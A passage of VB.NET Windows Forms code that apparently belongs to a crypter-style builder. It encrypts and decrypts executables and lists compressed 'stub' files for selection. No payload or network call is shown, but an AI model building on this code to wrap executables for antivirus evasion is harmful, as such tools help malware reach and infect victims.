        IO.File.WriteAllBytes(sPathPath & "_MD5_Encrypt.exe", bytTmp)
        bytTmp = Cryptor.MD5.Decrypt(bytTmp, KEY)
        IO.File.WriteAllBytes(sPathPath & "_MD5_Decrypt.exe", bytTmp)
    End Sub
#End If
#End Region

#End Region

#Region " Stubs "

    Private Sub btnRefreshStubs_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnRefreshStubs.Click
        Call RefreshStubs()
    End Sub

    Private Sub RefreshStubs()
        lvwStubs.BeginUpdate()
        lvwStubs.Items.Clear()
        For Each sFile As String In Directory.GetFiles(My.Application.Info.DirectoryPath & "\Stubs\", "*.bin")
            Dim oInfo As New IO.FileInfo(sFile)
            Dim oItem As New ListViewItem(oInfo.Name)
            Try
                Dim bytStub() As Byte = Compression.Decompress(IO.File.ReadAllBytes(sFile))
                oItem.SubItems.Add(FormatBytes(oInfo.Length))
                oItem.SubItems.Add(FormatBytes(bytStub.Length))
                oItem.Tag = oInfo
                lvwStubs.Items.Add(oItem)
            Catch : End Try
        Next
        lvwStubs.EndUpdate()
        If lvwStubs.Items.Count > 0 Then
            AddHandler lvwStubs.ItemChecked, AddressOf lvwStubs_ItemCheck
            lvwStubs.Items(0).Checked = True
        End If
    End Sub

    Private Sub lvwStubs_ItemCheck(ByVal sender As Object, ByVal e As System.Windows.Forms.ItemCheckedEventArgs)
        If lvwStubs.Items.Count > 1 Or __LvwStub Is Nothing Then
            RemoveHandler lvwStubs.ItemChecked, AddressOf lvwStubs_ItemCheck
            lvwStubs.BeginUpdate()
            If __LvwStub IsNot Nothing Then
                __LvwStub.Checked = False
            End If
            __LvwStub = e.Item
            e.Item.Checked = True
            AddHandler lvwStubs.ItemChecked, AddressOf lvwStubs_ItemCheck
            lvwStubs.EndUpdate()
        Else
            e.Item.Checked = True
        End If
    End Sub

#End Region

End Class
